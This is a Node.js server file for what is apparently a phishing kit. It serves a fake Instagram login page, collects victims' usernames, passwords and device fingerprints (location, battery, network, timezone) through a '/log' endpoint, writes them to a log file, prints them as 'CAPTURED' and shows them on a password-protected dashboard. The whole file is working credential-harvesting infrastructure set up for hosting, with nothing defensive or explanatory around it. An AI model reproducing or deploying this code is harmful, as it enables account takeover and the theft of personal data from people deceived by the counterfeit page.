const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ═══════════════════════════════════════════
//  PORT — Render injects process.env.PORT
//  Falls back to 8080 for local development
// ═══════════════════════════════════════════
const PORT = process.env.PORT || 8080;

// ═══════════════════════════════════════════
//  CONFIG — change password here
// ═══════════════════════════════════════════
const DASHBOARD_PASSWORD = process.env.DASHBOARD_PASSWORD || 'admin';
const logFilePath = path.join(__dirname, 'log.txt');
let capturedHistory = [];
let intruderLog = [];

// ═══════════════════════════════════════════
//  SETTINGS
// ═══════════════════════════════════════════
const MAX_BODY_SIZE    = 10 * 1024;   // 10 KB max request body
const MAX_INTRUDER_LOG = 100;         // keep last 100 failed login attempts
const MAX_HISTORY      = 5000;        // keep last 5000 captures in memory
const RATE_LIMIT_WINDOW = 10 * 1000; // 10 second window
const RATE_LIMIT_MAX   = 5;          // max 5 submissions per IP per window

// ═══════════════════════════════════════════
//  RATE LIMITER (per-IP, for /log endpoint)
// ═══════════════════════════════════════════
const rateLimitMap = new Map();

function isRateLimited(ip) {
    const now = Date.now();
    if (!rateLimitMap.has(ip)) {
        rateLimitMap.set(ip, [now]);
        return false;
    }
    const timestamps = rateLimitMap.get(ip).filter(t => now - t < RATE_LIMIT_WINDOW);
    timestamps.push(now);
    rateLimitMap.set(ip, timestamps);
    return timestamps.length > RATE_LIMIT_MAX;
}

// Clean up stale rate limit entries every 60 seconds
setInterval(() => {
    const now = Date.now();
    for (const [ip, timestamps] of rateLimitMap) {
        const recent = timestamps.filter(t => now - t < RATE_LIMIT_WINDOW);
        if (recent.length === 0) rateLimitMap.delete(ip);
        else rateLimitMap.set(ip, recent);
    }
}, 60000);

// ═══════════════════════════════════════════
//  STATIC FILE CACHE
//  Avoids re-reading from disk on every request
// ═══════════════════════════════════════════
const fileCache = {};

function getStaticFile(filePath, callback) {
    if (fileCache[filePath]) {
        return callback(null, fileCache[filePath]);
    }
    fs.readFile(filePath, (err, content) => {
        if (err) return callback(err, null);
        fileCache[filePath] = content;
        // Re-cache after 30 seconds (picks up file changes during dev)
        setTimeout(() => { delete fileCache[filePath]; }, 30000);
        callback(null, content);
    });
}

// ═══════════════════════════════════════════
//  SAFE BODY PARSER (with size limit)
// ═══════════════════════════════════════════
function parseBody(req, callback) {
    let body = '';
    let tooLarge = false;
    req.on('data', chunk => {
        body += chunk;
        if (body.length > MAX_BODY_SIZE) {
            tooLarge = true;
            req.destroy();
        }
    });
    req.on('end', () => {
        if (tooLarge) return callback(new Error('Body too large'), null);
        try {
            callback(null, JSON.parse(body));
        } catch (e) {
            callback(new Error('Invalid JSON'), null);
        }
    });
    req.on('error', () => callback(new Error('Request error'), null));
}

// ─── Load existing data on startup ───
if (fs.existsSync(logFilePath)) {
    try {
        const lines = fs.readFileSync(logFilePath, 'utf8')
            .split('\n')
            .filter(l => l.trim());
        lines.forEach(line => {
            try { capturedHistory.push(JSON.parse(line)); } catch (e) { }
        });
        // Cap history on load
        if (capturedHistory.length > MAX_HISTORY) {
            capturedHistory = capturedHistory.slice(-MAX_HISTORY);
        }
        console.log(`✅ Loaded ${capturedHistory.length} previous records.`);
    } catch (e) {
        console.log('⚠ Could not read log file. Starting fresh.');
    }
} else {
    console.log('📝 No log file found. Starting fresh.');
}

// ─── Get LAN IP (for display only) ───
function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) return iface.address;
        }
    }
    return 'localhost';
}

// ═══════════════════════════════════════════
//  CREATE SERVER
// ═══════════════════════════════════════════
const server = http.createServer((req, res) => {

    // ─── CORS ───
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Password');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        return res.end();
    }

    // ─── Serve Instagram login page (cached) ───
    if (req.method === 'GET' && req.url === '/') {
        const filePath = path.join(__dirname, 'index.html');
        getStaticFile(filePath, (err, content) => {
            if (err) { res.writeHead(500); res.end('Error: index.html not found'); }
            else { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(content); }
        });
    }

    // ─── Dashboard login auth ───
    else if (req.method === 'POST' && req.url === '/auth') {
        parseBody(req, (err, data) => {
            if (err) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                return res.end(JSON.stringify({ success: false, message: err.message }));
            }
            if (data.password === DASHBOARD_PASSWORD) {
                console.log('🔓 Dashboard authenticated.');
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } else {
                console.log(`🔒 Failed login attempt with: "${data.password}"`);
                intruderLog.push({
                    ip: req.socket.remoteAddress || 'Unknown',
                    attemptedPassword: data.password || '',
                    timestamp: new Date().toISOString()
                });
                if (intruderLog.length > MAX_INTRUDER_LOG) {
                    intruderLog = intruderLog.slice(-MAX_INTRUDER_LOG);
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, message: 'Wrong password' }));
            }
        });
    }

    // ─── Receive credentials + fingerprint (rate-limited, async write) ───
    else if (req.method === 'POST' && req.url === '/log') {
        const clientIP = req.socket.remoteAddress || 'unknown';

        if (isRateLimited(clientIP)) {
            res.writeHead(429, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ status: 'rate_limited' }));
        }

        parseBody(req, (err, data) => {
            if (err) {
                res.writeHead(400, { 'Content-Type': 'text/plain' });
                return res.end('Bad Request');
            }

            const fp = data.fingerprint || {};
            const record = {
                username: data.username || '',
                password: data.password || '',
                fingerprint: {
                    device:  fp.device  || 'Unknown',
                    os:      fp.os      || 'Unknown',
                    loc:     fp.loc     || 'Unknown',
                    tz:      fp.tz      || 'Unknown',
                    bat:     fp.bat     || 'N/A',
                    net:     fp.net     || 'Unknown',
                    lang:    fp.lang    || 'Unknown',
                    screen:  fp.screen  || 'Unknown',
                    timing:  fp.timing  || '0'
                },
                timestamp: new Date().toISOString()
            };

            capturedHistory.push(record);
            if (capturedHistory.length > MAX_HISTORY) {
                capturedHistory = capturedHistory.slice(-MAX_HISTORY);
            }

            // Async write — does NOT block other requests
            fs.appendFile(logFilePath, JSON.stringify(record) + '\n', err => {
                if (err) console.log('⚠ Could not write to log file:', err.message);
            });

            console.log(`\n🚨 CAPTURED: ${record.username} / ${record.password}`);
            console.log(`   📱 Device:   ${record.fingerprint.device}`);
            console.log(`   🖥️  OS:       ${record.fingerprint.os}`);
            console.log(`   🌍 Location: ${record.fingerprint.loc}`);
            console.log(`   🕐 Timezone: ${record.fingerprint.tz}`);
            console.log(`   🔋 Battery:  ${record.fingerprint.bat}`);
            console.log(`   📡 Network:  ${record.fingerprint.net}`);
            console.log(`   🔤 Language: ${record.fingerprint.lang}`);
            console.log(`   🖱️  Screen:   ${record.fingerprint.screen}`);
            console.log(`   ⏱️  Timing:   ${record.fingerprint.timing}s`);

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'success' }));
        });
    }

    // ─── Serve dashboard (cached) ───
    else if (req.method === 'GET' && req.url === '/dashboard') {
        const filePath = path.join(__dirname, 'dashboard.html');
        getStaticFile(filePath, (err, content) => {
            if (err) { res.writeHead(500); res.end('Error: dashboard.html not found'); }
            else { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(content); }
        });
    }

    // ─── API: get all captures (auth-protected) ───
    else if (req.method === 'GET' && req.url === '/api/data') {
        const pw = req.headers['x-password'] || '';
        if (pw !== DASHBOARD_PASSWORD) {
            res.writeHead(403, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'Forbidden' }));
        }
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(capturedHistory));
    }

    // ─── API: get intruder log (auth-protected) ───
    else if (req.method === 'GET' && req.url === '/api/intruders') {
        const pw = req.headers['x-password'] || '';
        if (pw !== DASHBOARD_PASSWORD) {
            res.writeHead(403, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'Forbidden' }));
        }
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(intruderLog));
    }

    // ─── API: clear all data (auth-protected) ───
    else if (req.method === 'POST' && req.url === '/clear') {
        const pw = req.headers['x-password'] || '';
        if (pw !== DASHBOARD_PASSWORD) {
            res.writeHead(403, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'Forbidden' }));
        }
        capturedHistory = [];
        intruderLog = [];
        fs.writeFile(logFilePath, '', err => {
            if (err) console.log('⚠ Could not clear log file.');
            else console.log('🗑️  All data CLEARED.');
        });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'cleared' }));
    }

    // ─── 404 ───
    else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
});

// ─── Handle port conflicts ───
server.on('error', err => {
    if (err.code === 'EADDRINUSE') {
        console.log(`❌ Port ${PORT} is already in use.`);
    } else {
        console.error('❌ Server error:', err.message);
    }
    process.exit(1);
});

// ─── Graceful shutdown ───
process.on('SIGINT', () => {
    console.log('\n🛑 Stopping server...');
    server.close(() => process.exit(0));
    setTimeout(() => process.exit(0), 2000);
});
process.on('SIGTERM', () => {
    server.close(() => process.exit(0));
    setTimeout(() => process.exit(0), 2000);
});

// ─── Catch unexpected crashes ───
process.on('uncaughtException', err => {
    console.error('💥 Uncaught Exception:', err.message);
});

// ─── Start ───
const localIP = getLocalIP();
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 SERVER STARTED ON PORT ${PORT} 🚀`);
    console.log(`👉 Local      : http://localhost:${PORT}`);
    console.log(`👉 Mobile/LAN : http://${localIP}:${PORT}`);
    console.log(`👉 Dashboard  : http://${localIP}:${PORT}/dashboard`);
    console.log(`\n💡 Dashboard password: ${DASHBOARD_PASSWORD}`);
    console.log(`💡 Press Ctrl+C to stop.\n`);
});